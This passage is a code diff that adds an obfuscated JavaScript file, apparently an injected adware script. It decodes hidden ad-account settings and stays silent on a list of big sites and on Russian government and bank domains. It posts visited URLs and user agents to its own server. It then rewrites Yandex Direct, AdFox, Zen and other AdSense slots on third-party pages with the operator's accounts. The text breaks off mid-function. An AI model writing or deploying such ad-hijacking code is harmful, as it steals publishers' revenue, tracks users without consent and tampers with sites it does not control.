@@ -1,0 +1,2536 @@
+
+var tag = "1810";
+var did = "1";
+var country_code__ = "US";
+
+try {
+var _0xcbf9=['BsKuUSXDuSscw67CksOXwrvCncOqHsKBw5PDkQDCllpDwodmwqB/w5EdccKofgsZMcOQwqdLVcO3woNy','w6ktLcK/wp/DkcKzHWpIwoUFewZcaMOIYsOjw57DpXfDsXg9TVLCtMKYwozCmcKkw5A2w7x5w7Z5woQ=','DMKRw4Yjwq0Yw4A+w6t7w5lYw78sI8OTB2LCh8KywrTCtg4hw6PDpEzCuxvDuRBAwqrDgcOIXsOcPC4=','IMKePMKqw4Rvw5ZNUMOVwolyDFjCp8KNw4xkDAcEb8Kqw43CihXCgXJmwpQrwptiw7g/XwbDs0Y=','A8OefsOow57CssKyw5bCrR1QwrjDnxYvwqHDiMKLw6QFKiPDgMKqGXdmwq7CnMOnBXXDocOlw6jCo8Kmw73Dgw==','w4HCkX/CrhluDcKkw4kGJcOlw5sFw6klw4rDuz/DqsOCwpY1w6pId8Obw41/YAzCjcO1Xy1wcMOCKik=','N8Kaw4HDn33DtMO2d8KiE2pZw5nDlWsfIsKtb8Ojw57DhcK6wplGVTTCj8Ozw48qXsOWRMKDwprCqcOtPQ==','wpbDh0law43Di1dVwrrDlQl8T8O2REB2','A8OefsOow57CssKyw5bCrR1QwrjDmx0uwqbDjsKPw6oFJCbDisKoFnZnwqzCnMK5AHnDocKlw6/CuMO3wqvClcKM','w4LClMKTw7d6wpTCosKLQjfDgsODwoLDn8OOwpoTO8KaLi1PdsORwrtdw6ANwqXCpcOJw4rCj8OoIcKMZ2pKw68=','w4LClMKTw7d6wpTCosKLQjfDgsODwoTDnsODwpkQP8KULC5EcMORwrZXw6AIwqXDv8KKwovDk8KsIMOFZTQF','w7Rgwrsew7TDncKa','P1XDsH7Co8OgX0V/D8ONBzvCp8OV','w5bCkXNvS3gc','w5PChsKIw6I=','w5gfZ8Ozw4XCg8Ow','EMOXUMKWw4U9wooUw71IwrMjGWfCvh4=','wp9Sw7nCt8OOw47Dlg==','XsOWCsKXZQFq','TBseGGFTwqM=','w5RQw6BJwrXChMOfwqY=','w7DCgQjCh8KeVnrDjFrDv8KTdsKswovDk37Dk8KKHsKQw6xbwrDChFhNwqvChXbCsAHDosKcIU/CisKaLh0=','wqTCp0oWdVYGw5jDnAfChsOcwptYwoLCsjnDsMO7wr3Dq8Ojw4PChj0Dw64OPkDDjXcXVMOMw7fCosOjw6k=','E8OTVsKWw4I2wp9Kw5Jewr5gVTfDt1jDqFluw5p9woHDjgTDk8ONwp9YTxXClsK/XhQTw5QEwrrCgw==','w4LCjWfDohtYWEURw5/CvcOZw5RcLMKywpZgEWtRw55PwoLCs2F9w7Qgw6PCvggwFlAOwoJ3wr8=','w7DCgQjCh8KeVnrDjFrDv8KTdsKvwojDk3rDlcKNHcKcw65ZwrnCjFRJwqHCg3bCtg7DosKRI0nCjcKZKRg=','wp/CsCVqwqjCrElaElDCoR4lw7omdAgNRcOZbBbCvFMEIMOswpPDrWjDpMODw4bCi8OBcFd7wrw=','EhXCpXgMfg4fwqvDqEUNwrpHVcOWD8KFJAwUVsOifTzDoQwtwog1fl7DisKPRlxKHXg=','w7PDl0QTw6NNbSBzwrrCr8Kpw53Ci2MRwoDCsmzCkyh0fEnDsHbCtcKpYsOWBcOpfHXDhgd8w5XCsw==','w6B7WMOHwpV5wpVYw73CtcK1MMOZMsO1fjhvwpXChF/CqTzCssKhwpBzZllnV3h5bRZJfl7DnA==','w5/DhSXDjV/DqMOWwrlXOwXDuxl4R8KoOWfDkcOHw7pNaycmbnQ2SDUvJ8KED27CgVF3Ig==','IznCqsKsMsOQw7/Csms+UcKpc2ZLfgoHCR3CmThNwpvCs2wkVMOawrUhw7vCmMOxCHDDpcK2VA==','WyEFw7J6OzXDuHRrKmbDrBkTw6JWwoHDqQlgwpPDkMO2w6rDsArDiXvDpiHCsHnDgsO+wp/CiWx0','IznCqsKsMsOQw7/Csms+UcKpdGFGfAkBDRTCnDlBwpnCtW0tV8Oawrkiw7zCnsO0CXvDoMKyXQ==','wq5gwrPDu8KUwpzClXfCpcOrNsOqw5cAw5/DoMK8w5vCvsOSJcOAw7HCm3LCgMOSFMKxwr8nw5cLw6TClAYNw4ZA','w6TCrlxow7p+w4wVw7UQwqrCnQTDpMOALMKPwpbCg8KUw6IiFmzCr8KGO8ORwqJkw7zCtsOJBMOUwqUAwpLCh8OA','w5HCh14tFUJcw7fDhsOUGwBtCBnCt8KXc8OXK8OQYsO1w5gGwoLClR3Cuz3CrEzDm1NoJMKpw5TCqA==','IznCqsKsMsOQw7/Csms+UcKpd2VCfw0IBB7CkzhIwp/Ctm8lUMOawr8lw73CncO4D3rDpMK5VA==','wpbCgUTDm3PCoUzCtsKew4jCt8Omw6nCh8OGw7rDtA==','VsKnwr3CqkLCuHjDocOsTcOWRxAfDAQ4wqBqPBHCg8K1wqJqw4TCssO1YcOzw63DsnTDoxYMUQZa'];(function(_0x24f9e2,_0x4ba873){var _0x550d19=function(_0x275f32){while(--_0x275f32){_0x24f9e2['push'](_0x24f9e2['shift']());}};_0x550d19(++_0x4ba873);}(_0xcbf9,0x89));var _0x571b=function(_0xe983e7,_0x31ce4b){_0xe983e7=_0xe983e7-0x0;var _0x25d7cc=_0xcbf9[_0xe983e7];if(_0x571b['aDIIVK']===undefined){(function(){var _0x43094a;try{var _0xd018a9=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x43094a=_0xd018a9();}catch(_0x2d68f3){_0x43094a=window;}var _0x1627e3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x43094a['atob']||(_0x43094a['atob']=function(_0x1cad91){var _0x1b54f6=String(_0x1cad91)['replace'](/=+$/,'');for(var _0x5d708e=0x0,_0x3f351e,_0x559fb6,_0x1f5e9c=0x0,_0x4c7a09='';_0x559fb6=_0x1b54f6['charAt'](_0x1f5e9c++);~_0x559fb6&&(_0x3f351e=_0x5d708e%0x4?_0x3f351e*0x40+_0x559fb6:_0x559fb6,_0x5d708e++%0x4)?_0x4c7a09+=String['fromCharCode'](0xff&_0x3f351e>>(-0x2*_0x5d708e&0x6)):0x0){_0x559fb6=_0x1627e3['indexOf'](_0x559fb6);}return _0x4c7a09;});}());var _0x569dd4=function(_0x546d5e,_0x31ce4b){var _0x4c669b=[],_0x42c538=0x0,_0x1cfa64,_0x48ed07='',_0x359078='';_0x546d5e=atob(_0x546d5e);for(var _0x46d4db=0x0,_0x2fe534=_0x546d5e['length'];_0x46d4db<_0x2fe534;_0x46d4db++){_0x359078+='%'+('00'+_0x546d5e['charCodeAt'](_0x46d4db)['toString'](0x10))['slice'](-0x2);}_0x546d5e=decodeURIComponent(_0x359078);for(var _0x57e826=0x0;_0x57e826<0x100;_0x57e826++){_0x4c669b[_0x57e826]=_0x57e826;}for(_0x57e826=0x0;_0x57e826<0x100;_0x57e826++){_0x42c538=(_0x42c538+_0x4c669b[_0x57e826]+_0x31ce4b['charCodeAt'](_0x57e826%_0x31ce4b['length']))%0x100;_0x1cfa64=_0x4c669b[_0x57e826];_0x4c669b[_0x57e826]=_0x4c669b[_0x42c538];_0x4c669b[_0x42c538]=_0x1cfa64;}_0x57e826=0x0;_0x42c538=0x0;for(var _0x3d5976=0x0;_0x3d5976<_0x546d5e['length'];_0x3d5976++){_0x57e826=(_0x57e826+0x1)%0x100;_0x42c538=(_0x42c538+_0x4c669b[_0x57e826])%0x100;_0x1cfa64=_0x4c669b[_0x57e826];_0x4c669b[_0x57e826]=_0x4c669b[_0x42c538];_0x4c669b[_0x42c538]=_0x1cfa64;_0x48ed07+=String['fromCharCode'](_0x546d5e['charCodeAt'](_0x3d5976)^_0x4c669b[(_0x4c669b[_0x57e826]+_0x4c669b[_0x42c538])%0x100]);}return _0x48ed07;};_0x571b['yXcpbT']=_0x569dd4;_0x571b['gKmWPm']={};_0x571b['aDIIVK']=!![];}var _0x1d66b7=_0x571b['gKmWPm'][_0xe983e7];if(_0x1d66b7===undefined){if(_0x571b['taEuEE']===undefined){_0x571b['taEuEE']=!![];}_0x25d7cc=_0x571b['yXcpbT'](_0x25d7cc,_0x31ce4b);_0x571b['gKmWPm'][_0xe983e7]=_0x25d7cc;}else{_0x25d7cc=_0x1d66b7;}return _0x25d7cc;};window[_0x571b('0x0','sx*H')]=window[_0x571b('0x1','2YFi')]||{};window[_0x571b('0x2','n$Q%')][_0x571b('0x3','Hddd')]={'100':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x4','1CSP'),'intext_slot':null,'allow_two_blocks':![]},'95':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x5','%om#'),'intext_slot':null,'allow_two_blocks':![]},'101':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x6','DWZR'),'intext_slot':null,'allow_two_blocks':![]},'102':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x7','N^[%'),'intext_slot':null,'allow_two_blocks':![]},'103':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x8','1CSP'),'intext_slot':null,'allow_two_blocks':![]},'104':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x9','pSyB'),'intext_slot':null,'allow_two_blocks':![]},'105':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0xa','H1v&'),'intext_slot':null,'allow_two_blocks':![]},'93':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0xb','ckMm'),'intext_slot':null,'allow_two_blocks':!![]},'107':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0xc','DrlN'),'intext_slot':null,'allow_two_blocks':![]},'108':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0xd','@J@I'),'intext_slot':null,'allow_two_blocks':![]},'109':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0xe','SX*h'),'intext_slot':null,'allow_two_blocks':![]},'110':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0xf','V4b!'),'intext_slot':null,'allow_two_blocks':![]},'111':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x10','SX*h'),'intext_slot':null,'allow_two_blocks':![]},'112':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x11','sx*H'),'intext_slot':null,'allow_two_blocks':![]},'113':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x12','3nFv'),'intext_slot':null,'allow_two_blocks':![]},'98':{'context_client':null,'fluid_slot':null,'general_slot':'','cx':_0x571b('0x13','rBP^'),'intext_slot':null,'allow_two_blocks':!![]},'118':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x14','SX*h'),'intext_slot':null,'allow_two_blocks':!![]},'115':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x15','FeZ)'),'intext_slot':null,'allow_two_blocks':!![]},'96':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x16','NQCN'),'intext_slot':null,'allow_two_blocks':!![]},'114':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x17','&B&L'),'intext_slot':null,'allow_two_blocks':![]},'99':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x18','*[7@'),'intext_slot':null,'allow_two_blocks':!![]},'94':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x19','qr4j'),'intext_slot':null,'allow_two_blocks':!![]},'97':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x1a','yX%^'),'intext_slot':null,'allow_two_blocks':!![]},'106':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x1b','@(kl'),'intext_slot':null,'allow_two_blocks':!![]},'116':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x1c','q[@3'),'intext_slot':null,'allow_two_blocks':!![]},'117':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x1d','F[b3'),'intext_slot':null,'allow_two_blocks':!![]},'119':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x1e','El5x'),'intext_slot':null,'allow_two_blocks':!![]},'120':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x1f','@(kl'),'intext_slot':null,'allow_two_blocks':!![]},'121':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x20','l9ZJ'),'intext_slot':null,'allow_two_blocks':!![]},'122':{'context_client':null,'fluid_slot':null,'general_slot':null,'cx':_0x571b('0x21','l9ZJ'),'intext_slot':null,'allow_two_blocks':!![]}};window[_0x571b('0x22','Hddd')][_0x571b('0x23','rOBs')]=[{'tag':_0x571b('0x24','rBP^'),'did':'1','accounts':[{'adsense_account_id':0x61,'percent':0x64}],'browser':'','search_engine':'','newAdsenseAccount':0x61,'notification':''},{'tag':_0x571b('0x25','l9ZJ'),'did':'21','browser':'','search_engine':'','accounts':[{'adsense_account_id':0x61,'percent':0x64}],'newAdsenseAccount':0x61,'notification':''},{'tag':'ru','did':'21','accounts':[{'adsense_account_id':0x61,'percent':0x64}],'browser':'','search_engine':'','newAdsenseAccount':0x61,'notification':''},{'tag':'','did':'','accounts':[{'adsense_account_id':0x61,'percent':0x64}],'newAdsenseAccount':0x61,'notification':'','browser':'','search_engine':''}];window[_0x571b('0x26','*[7@')][_0x571b('0x27','DWZR')]=[];
+/* global skipAdsense */
+/* global skipOutput */
+
+if (!document) throw 'exit';
+document.body.setAttribute('data-script-loaded', "1");
+document.body.setAttribute('data-sl', "1");
+
+!function () {
+    var host = document.location.host.replace('www.', '');
+    var forbiddenHosts = [
+        'vkontakte.ru',
+        'vk.ru',
+        'vk.com',
+        'odnoklassniki.ru',
+        'ok.ru',
+        'mail.ru',
+        'yandex.ru',
+        'ya.ru',
+        'avito.ru',
+        'moevideo.biz',
+        'gismeteo.ru',
+        'ria.ru',
+        'drom.ru',
+        'kp.ru',
+        'rbc.ru',
+        'ren.tv',
+        'alibaba.com',
+        'vesti.ru',
+        'smi2.ru',
+        'echo.msk.ru',
+        'kinopoisk.ru',
+        'yaplakal.com',
+        'aliexpress.com',
+        'iz.ru',
+        'rambler.ru',
+        'lenta.ru',
+        'gazeta.ru',
+        'mk.ru',
+        'rt.com',
+        'aif.ru',
+        'fishki.net',
+        'rg.ru',
+        'life.ru',
+        'rutube.ru',
+        'woman.ru',
+        'mamba.ru',
+        'russianfood.com',
+        'videout.ru',
+        'rutracker.org',
+        'tutu.ru',
+        'youtube.com',
+        'wikipedia.org',
+        'instagram.com',
+        'livejournal.com',
+        'facebook.com',
+        'fb.com',
+        'fb.ru',
+        'drom.ru',
+        'ria.ru',
+        'pikabu.ru',
+        'wildberries.ru',
+        'twitch.tv',
+        'drive2.ru',
+        'vseigru.net',
+        'mvideo.ru',
+        'hh.ru',
+        'ozon.ru',
+        'yadi.sk',
+        'rutube.ru',
+        'youla.ru',
+        'lenta.ru',
+        'ivi.ru',
+        'auto.ru',
+        'seasonvar.ru',
+        'yaplakal.com',
+        'nsportal.ru',
+        'twitter.com',
+        'rbc.ru',
+        '1tv.ru',
+        'ntv.ru',
+        'tnt.ru',
+        'baidu.com',
+        'qq.com',
+        'taobao.com',
+        'yahoo.com',
+        'chaturbate.com',
+        'xvideos.com',
+        'ebay.com',
+        'netflix.com',
+        'tmall.com',
+        'xnxx.com',
+        'bing.com',
+        'sohu.com',
+        'cnn.com',
+        'jd.com',
+        'amazon.com',
+        'alipay.com',
+        'blogspot.com',
+        'reddit.com',
+        'dns-shop.ru',
+        'linkedin.com',
+        'weibo.com',
+        'live.com',
+        'youporn.com',
+        'bongacams.com',
+        'porn.com',
+    ];
+
+    for (var hostIndex = 0; hostIndex < forbiddenHosts.length; hostIndex++) {
+        if (host === forbiddenHosts[hostIndex]) window.skipAdsense = true;
+    }
+}();
+
+
+var isBingSearch = false;
+if (document.location.host.indexOf('bing.') !== -1) {
+    // Element.prototype.appendChild = Element.prototype.append;
+    if (window['AM']) {
+        window.AM.push("cse.google.com");
+        window.AM.push("google.com");
+        window.AM.push("www.google.com");
+        isBingSearch = true;
+    }
+}
+
+if (!window['skipOutput']) window.skipOutput = false;
+if (!window['ss78mest']) window.ss78mest = {};
+
+var ourDomain = '';
+var scriptLocation = '';
+var scriptTags = document.getElementsByTagName("script");
+for (var i = 0; i < scriptTags.length; i++) {
+    var pattern = new RegExp("\\/(?:helper|i(?:|nject))\\.js", "i");
+    var scriptSrc = scriptTags[i].getAttribute("src");
+    if (pattern.test(scriptSrc)) {
+        scriptLocation = scriptSrc;
+        ourDomain = scriptSrc.match(/https?:\/\/([^\/]+)\//)[1]
+    }
+}
+
+if (window.top === window && document.head) {
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    var script_old_new = document.createElement('script');
+    script_old_new.src = "https://www.googletagmanager.com/gtag/js?id=UA-127560459-1";
+    script_old_new.async = false;
+    document.head.appendChild(script_old_new);
+
+    window.dataLayer = window.dataLayer || [];
+
+    gtag = function () {
+        try {
+            dataLayer.push(arguments);
+        } catch (e) {
+
+        }
+    };
+
+    window.gtag = gtag;
+    gtag('js', new Date());
+
+    gtag('config', 'UA-127560459-1');
+    // console.log('[analytics] init')
+} else {
+    gtag = function () {}
+}
+
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = window.location.search.substring(1),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
+        }
+    }
+};
+
+
+!function () {
+    var sTag = window['tag'] || '';
+    var iDid = window['did'] || '0';
+    var skipReport = false;
+    var adsenseScriptInserted = false;
+
+    iDid = parseInt(iDid);
+
+    var reportData = {
+        did: iDid,
+        tag: sTag,
+        r: encodeURIComponent(document.location.href),
+        ua: navigator.userAgent,
+        aac: ''
+    };
+
+
+    if (
+        (document.location.host === 'yastatic.net')
+        || (document.location.host.match(/clients[0-9]+\.google\.com/))
+        || (document.location.host === 'notifications.google.com')
+        || (document.location.host === 'clients5.google.com')
+        || (document.location.host === 'accounts.google.com')
+        || (document.location.host === 'sberbank.ru')
+        || (document.location.host === '_osuslugi.ru'.replace('_', 'g'))
+        || (document.location.host === 'accounts.google.com')
+        || (document.location.host === 'console.firebase.google.com')
+        || (document.location.host.replace('www.', '') === 'kremlin.ru')
+        || (document.location.host.replace('www.', '') === 'kremlin.ru')
+        || (document.location.host.replace('www.', '') === 'kremlin.ru')
+        || (document.location.host.replace('www.', '') === 'sovetnational.ru')
+        || (document.location.host.replace('www.', '') === 'ksrf.ru')
+        || (document.location.host.replace('www.', '') === 'vsrf.ru')
+        || (document.location.host.replace('www.', '') === 'arbitr.ru')
+        || (document.location.host.replace('www.', '') === 'government.ru')
+        || (document.location.host.replace('www.', '') === 'mvd.ru')
+        || (document.location.host.replace('www.', '') === 'mid.ru')
+        || (document.location.host.replace('www.', '') === 'mil.ru')
+        || (document.location.host.replace('www.', '') === 'minjust.ru')
+        || (document.location.host.replace('www.', '') === 'rosminzdrav.ru')
+        || (document.location.host.replace('www.', '') === 'mkrf.ru')
+        || (document.location.host.replace('www.', '') === 'минобрнауки.рф')
+        || (document.location.host.replace('www.', '') === 'minvr.ru')
+        || (document.location.host.replace('www.', '') === 'minsvyaz.ru')
+        || (document.location.host.replace('www.', '') === 'mcx.ru')
+        || (document.location.host.replace('www.', '') === 'minstroyrf.ru')
+        || (document.location.host.replace('www.', '') === 'mintrans.ru')
+        || (document.location.host.replace('www.', '') === 'rosmintrud.ru')
+        || (document.location.host.replace('www.', '') === 'minfin.ru')
+        || (document.location.host.replace('www.', '') === 'fstec.ru')
+        || (document.location.host.replace('www.', '') === 'fsin.su')
+        || (document.location.host.replace('www.', '') === 'fssprus.ru')
+        || (document.location.host.replace('www.', '') === 'roszdravnadzor.ru')
+        || (document.location.host.replace('www.', '') === 'meteorf.ru')
+        || (document.location.host.replace('www.', '') === 'fsvps.ru')
+        || (document.location.host.replace('www.', '') === 'rostransnadzor.ru')
+        || (document.location.host.replace('www.', '') === 'rostrud.ru')
+        || (document.location.host.replace('www.', '') === 'nalog.ru')
+        || (document.location.host.replace('www.', '') === 'fsrar.ru')
+        || (document.location.host.replace('www.', '') === 'gks.ru')
+        || (document.location.host.replace('www.', '') === 'customs.ru')
+        || (document.location.host.replace('www.', '') === 'roskazna.ru')
+        || (document.location.host.replace('www.', '') === 'rosreestr.ru')
+        || (document.location.host.replace('www.', '') === 'rupto.ru')
+        || (document.location.host.replace('www.', '') === 'fmbaros.ru')
+        || (document.location.host.replace('www.', '') === 'russiatourism.ru')
+        || (document.location.host.replace('www.', '') === 'gost.ru')
+        || (document.location.host.replace('www.', '') === 'rossvyaz.ru')
+        || (document.location.host.replace('www.', '') === 'favt.ru')
+        || (document.location.host.replace('www.', '') === 'rosavtodor.ru')
+        || (document.location.host.replace('www.', '') === 'roszeldor.ru')
+        || (document.location.host.replace('www.', '') === 'morflot.ru')
+        || (document.location.host.replace('www.', '') === 'rosim.ru')
+        || (document.location.host.replace('www.', '') === 'archives.ru')
+        || (document.location.host.replace('www.', '') === 'rosreserv.ru')
+        || (document.location.host.replace('www.', '') === 'udprf.ru')
+        || (document.location.host.replace('www.', '') === 'rosatom.ru')
+        || (document.location.host.replace('www.', '') === 'roscosmos.ru')
+        || (document.location.host.replace('www.', '') === 'pfrf.ru')
+        || (document.location.host.replace('www.', '') === 'ffoms.ru')
+        || (document.location.host.replace('www.', '') === 'fss.ru')
+
+        // || (document.location.host === 'googleads.g.doubleclick.net')
+        || (document.location.host.indexOf('.gov.ru') !== -1)
+        || (document.location.host.indexOf('gstatic.com') !== -1)
+        || (document.location.host.indexOf('googlesyndication.com') !== -1)
+    ) {
+        // console.log('[start] ' + document.location.href + ': skipped');
+
+        skipOutput = true;
+        return;
+    }
+
+    if (typeof window['Promise'] === 'undefined') {
+        gtag('event', 'no_promise', {"event_label": navigator.userAgent});
+    }
+
+    window.bl123sendEvent = function (event, action) {
+        var xhr = new XMLHttpRequest();
+
+        xhr.open("POST", '//' + ourDomain + '/events');
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send('name=' + encodeURIComponent(event) + '&action=' + encodeURIComponent(action));
+    };
+    var yandexSearchText = '';
+    var matched;
+    var YaRumAjaxStart = 0;
+    var replaceBannersIndex = 0;
+
+    var chooseAdsenseAccount = function (did, tag, type) {
+        // console.log({did, tag});
+        did = parseInt(did);
+        var settings = AS88471['settings_' + type];
+        if (!settings) {
+            // console.log('[' + type + '] exiting');
+            return {};
+        }
+
+        var thisBrowser = navigator.userAgent.match(/Yandex/) ? 'yandex' : 'chrome';
+        var thisSearchEngine = document.location.host.match(/google/) ? 'google' : 'yandex';
+
+        var block = settings.filter(function (el) {
+            var tags = el.tag.split(",").map(function (tag) {
+                return tag.trim()
+            }).filter(function (el) {
+                return el !== ''
+            });
+
+            var dids = el.did.split(",").map(function (did) {
+                return parseInt(did)
+            }).filter(function (el) {
+                return (String(el) !== '');
+            });
+
+            var browser = el.browser;
+            var searchEngine = el.search_engine;
+
+            return ((0 === tags.length) || (tags.indexOf(tag) !== -1))
+                && ((0 === dids.length) || (dids.indexOf(did) !== -1))
+                && (('' === browser) || (thisBrowser === browser))
+                && (('' === searchEngine) || (thisSearchEngine === searchEngine));
+        });
+
+        if (block.length !== 1) {
+            block = settings.filter(function (el) {
+                return el.tag === '' && el.did === '' && el.browser === thisBrowser;
+            });
+        }
+
+        if (block.length !== 1) {
+            // console.log('[' + type + '] fallback');
+            block = settings.filter(function (el) {
+                return el.tag === '' && el.did === '';
+            });
+        } else {
+            // console.log('[' + type + '] found')
+        }
+
+        block = block[0];
+        if (!block) return;
+
+        var lastPercent = 0;
+
+        var accounts = block.accounts.map(function (el) {
+            el.percent = parseFloat(String(el.percent));
+            return el;
+        }).sort(function (a, b) {
+            return a.percent - b.percent;
+        }).map(function (el) {
+            el['from'] = lastPercent;
+            el['to'] = lastPercent + el.percent;
+
+            lastPercent += el.percent;
+
+            return el;
+        });
+
+        // console.log(accounts);
+
+        var maxValue = accounts[accounts.length - 1].to;
+
+        var instanceId = window['jj837711'] ? parseInt(window['jj837711']) : 0;
+        if (isNaN(instanceId)) instanceId = 0;
+        // console.log('[' + type + '] ' + instanceId);
+        var r = instanceId % maxValue;
+
+        for (var i = 0; i < accounts.length; i++) {
+            var account = accounts[i];
+            if (r >= account.from && r < account.to) {
+                // console.log(AS88471.accounts[account.adsense_account_id]);
+                return AS88471.accounts[account.adsense_account_id];
+            }
+        }
+
+        // console.log('[' + type + '] wtf??');
+
+        return AS88471.accounts[accounts[0].adsense_account_id];
+    };
+
+    var searchAdsenseAccount = chooseAdsenseAccount(window['did'], window['tag'], 'search');
+    var contextAdsenseAccount = chooseAdsenseAccount(window['did'], window['tag'], 'context');
+
+    var report = function () {
+        var xhr = new XMLHttpRequest();
+
+        xhr.open("POST", "//" + ourDomain + "/a_d_r", true);
+
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send("host=" + encodeURIComponent(document.location.host));
+    };
+    var replaceZen = function () {
+        if (('undefined' !== typeof skipAdsense) && skipAdsense) return;
+
+        var ar = [
+            'YandexZen\\.renderWidget\\({[^}]+container\\:\\s*(?:[\'"])(.*)(?:[\'"])',
+        ];
+        var altered = false;
+
+        for (var ri = 0; ri < ar.length; ri++) {
+            var r = ar[ri];
+            var matches = document.body.innerHTML.match(new RegExp(r, 'g'));
+
+            if (!matches) continue;
+            for (var i = 0; i < matches.length; i++) {
+                var oneRes = matches[i];
+                var matched = oneRes.match(new RegExp(r));
+                var blockSel = matched[1];
+
+                var els = document.querySelectorAll(blockSel);
+                for (var index in els) {
+                    if (!els.hasOwnProperty(index)) continue;
+                    var el = els[index];
+
+                    el.innerHTML = '';
+                    var blockSelForCss = blockSel.replace('#', '').replace('.', '');
+                    // el.outerHTML = el.outerHTML.replace(blockSelForCss, blockSelForCss + '-mastered');
+                    skipOutput = true;
+
+                    appendAdsBlock(el);
+                    altered = true;
+                }
+            }
+        }
+
+        return altered;
+    };
+    var searchYatags = function () {
+        var altered = false;
+        try {
+            var yatags = document.querySelectorAll('div > yatag');
+
+            for (var i = 0; i < yatags.length; i++) {
+
+                var el = yatags[i].parentNode;
+
+                // el.setAttribute('id', blockId + '-mastered');
+                el.innerHTML = '';
+                appendAdsBlock(el);
+                altered = true;
+
+            }
+
+            return altered;
+        } catch (e) {
+            // console.log('EXCEPTION!!!!!!!!', e)
+        }
+    };
+    var replaceDirectOld = function () {
+        if (('undefined' !== typeof skipAdsense) && skipAdsense) return;
+        var altered = searchYatags();
+
+        var timeoutId = setInterval(searchYatags, 100);
+        setTimeout(function () {
+            clearInterval(timeoutId)
+        }, 5000);
+
+        return altered;
+    };
+    var replaceDirect = function () {
+        if (('undefined' !== typeof skipAdsense) && skipAdsense) return;
+
+        var ar = [
+            'Ya\\.Direct\\.insertInto\\(\\s*[0-9]*,\\s*"([^"]+)"',
+            'Ya\\.Context\\.AdvManager\\.render\\({\\s*blockId: "[^"]+",\\s*renderTo: "([^"]+)"',
+        ];
+        var altered = false;
+
+        for (var ri = 0; ri < ar.length; ri++) {
+            var r = ar[ri];
+            var matches = document.body.innerHTML.match(new RegExp(r, 'g'));
+
+            if (!matches) continue;
+            for (var i = 0; i < matches.length; i++) {
+                var oneRes = matches[i];
+                var matched = oneRes.match(new RegExp(r));
+                var blockId = matched[1];
+
+                var el;
+                if (!(el = document.getElementById(blockId))) continue;
+                skipOutput = true;
+
+                el.setAttribute('id', blockId + '-mastered');
+                appendAdsBlock(el);
+                altered = true;
+            }
+        }
+
+        return altered;
+    };
+    var replaceAdFox = function () {
+        if (('undefined' !== typeof skipAdsense) && skipAdsense) return;
+        // return;
+        var ar = ['adfoxCode\\.createAdaptive\\([^)]+containerId:\\s*[\'"]([^\'"]+)[^)]+desktop[^)]+\\)'];
+        var altered = false;
+
+        for (var ri = 0; ri < ar.length; ri++) {
+            var r = ar[ri];
+            var matches = document.body.innerHTML.match(new RegExp(r, 'g'));
+
+            if (!matches) continue;
+            for (var i = 0; i < matches.length; i++) {
+                var oneRes = matches[i];
+                var matched = oneRes.match(new RegExp(r));
+                var blockId = matched[1];
+
+                var el;
+                if (!(el = document.getElementById(blockId))) continue;
+                skipOutput = true;
+
+                el.innerHTML = '';
+                el.setAttribute('id', blockId + '-mastered');
+                appendAdsBlock(el);
+
+                altered = true;
+            }
+        }
+
+        return altered;
+    };
+    var replaceAds = function () {
+        if (!contextAdsenseAccount) return;
+
+        if (('undefined' !== typeof skipAdsense) && skipAdsense) return;
+        var index;
+        var insElements = document.querySelectorAll('ins.adsbygoogle');
+        var altered = false;
+
+
+        for (index in insElements) {
+            if (!insElements.hasOwnProperty(index)) continue;
+            var insEl = insElements[index];
+
+            var format = insEl.getAttribute('data-ad-format');
+            var layout = insEl.getAttribute('data-ad-layout');
+
+            if ('fluid' === format) {
+                var context_client, slot_id;
+                context_client = contextAdsenseAccount.context_client;
+                slot_id = contextAdsenseAccount.fluid_slot;
+
+                insEl.setAttribute('data-ad-client', context_client);
+                insEl.removeAttribute('data-adsbygoogle-status');
+                insEl.removeAttribute('data-ad-channel');
+                insEl.setAttribute('data-ad-slot', slot_id);
+                insEl.innerHTML = '';
+
+                altered = true;
+            } else {
